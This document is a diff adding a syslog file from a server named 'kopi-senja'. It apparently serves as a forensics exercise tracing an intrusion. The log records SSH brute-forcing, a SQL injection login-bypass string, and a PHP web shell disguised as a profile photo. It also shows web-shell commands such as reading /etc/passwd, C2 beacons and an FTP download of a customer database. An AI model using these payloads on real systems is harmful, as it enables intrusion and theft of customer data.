@@ -1,0 +1,33 @@
+# /var/log/syslog pada server kopi-senja (10.10.15.5)
+# Periode: 2026-08-12 14:59:50 s/d 15:07:20 UTC
+# Server: kopi-senja (Ubuntu 22.04, hostname: kopi-senja)
+
+Aug 12 14:59:50 kopi-senja systemd[1]: Started DHCP client on eth0.
+Aug 12 14:59:52 kopi-senja systemd-timesyncd[620]: Timed out waiting for reply from 10.10.15.1:123
+Aug 12 15:00:00 kopi-senja sshd[1402]: Server listening on 0.0.0.0 port 22.
+Aug 12 15:00:52 kopi-senja sshd[1405]: Invalid user admin from 10.10.14.2 port 44022
+Aug 12 15:00:55 kopi-senja sshd[1406]: Invalid user root from 10.10.14.2 port 44037
+Aug 12 15:00:58 kopi-senja sshd[1407]: Invalid user oracle from 10.10.14.2 port 44051
+Aug 12 15:01:01 kopi-senja sshd[1408]: Invalid user ubnt from 10.10.14.2 port 44064
+Aug 12 15:01:05 kopi-senja sshd[1409]: error: maximum authentication attempts exceeded for invalid user ubnt from 10.10.14.2 port 44064
+Aug 12 15:01:07 kopi-senja sshd[1410]: Invalid user pi from 10.10.14.2 port 44078
+Aug 12 15:01:10 kopi-senja sshd[1411]: error: maximum authentication attempts exceeded for invalid user pi from 10.10.14.2 port 44078
+Aug 12 15:02:10 kopi-senja php[1500]: [admin/login.php] query: SELECT * FROM users WHERE username='admin' OR '1'='1' -- ' AND password='apa_saja'
+Aug 12 15:02:10 kopi-senja php[1501]: [admin/login.php] login success for user: admin
+Aug 12 15:02:15 kopi-senja php[1510]: [admin/upload_foto.php] uploaded file: foto_profil.php
+Aug 12 15:02:21 kopi-senja apache2[1520]: 10.10.14.2 - - [12/Aug/2026:15:02:21 +0000] "GET /uploads/foto_profil.php?cmd=id HTTP/1.1" 200 33
+Aug 12 15:02:24 kopi-senja apache2[1521]: 10.10.14.2 - - [12/Aug/2026:15:02:24 +0000] "GET /uploads/foto_profil.php?cmd=uname%20-a HTTP/1.1" 200 35
+Aug 12 15:02:27 kopi-senja apache2[1522]: 10.10.14.2 - - [12/Aug/2026:15:02:27 +0000] "GET /uploads/foto_profil.php?cmd=cat%20/etc/passwd HTTP/1.1" 200 130
+Aug 12 15:02:30 kopi-senja apache2[1523]: 10.10.14.2 - - [12/Aug/2026:15:02:30 +0000] "GET /uploads/foto_profil.php?cmd=whoami HTTP/1.1" 200 8
+Aug 12 15:02:35 kopi-senja systemd[1]: Stopping Apache httpd web server...
+Aug 12 15:02:36 kopi-senja systemd[1]: Starting Apache httpd web server...
+Aug 12 15:04:34 kopi-senja php[1600]: [gate.php] beacon received from 10.10.15.5 to c2.kopi-senja-bot.net
+Aug 12 15:04:41 kopi-senja php[1601]: [gate.php] beacon received from 10.10.15.5 to c2.kopi-senja-bot.net
+Aug 12 15:04:48 kopi-senja php[1602]: [gate.php] beacon received from 10.10.15.5 to c2.kopi-senja-bot.net
+Aug 12 15:04:55 kopi-senja php[1603]: [gate.php] beacon received from 10.10.15.5 to c2.kopi-senja-bot.net
+Aug 12 15:05:02 kopi-senja php[1604]: [gate.php] beacon received from 10.10.15.5 to c2.kopi-senja-bot.net
+Aug 12 15:07:01 kopi-senja vsftpd[1700]: CONNECT: Client "203.0.113.66"
+Aug 12 15:07:02 kopi-senja vsftpd[1701]: OK LOGIN: Client "203.0.113.66"
+Aug 12 15:07:03 kopi-senja vsftpd[1702]: [backup] OK DOWNLOAD: Client "203.0.113.66", "/backup/customer_db.zip", 2457600 bytes
+Aug 12 15:07:10 kopi-senja vsftpd[1703]: FTP response: Client "203.0.113.66", "226 Transfer complete"
+Aug 12 15:07:13 kopi-senja vsftpd[1704]: FTP command: Client "203.0.113.66", "QUIT"
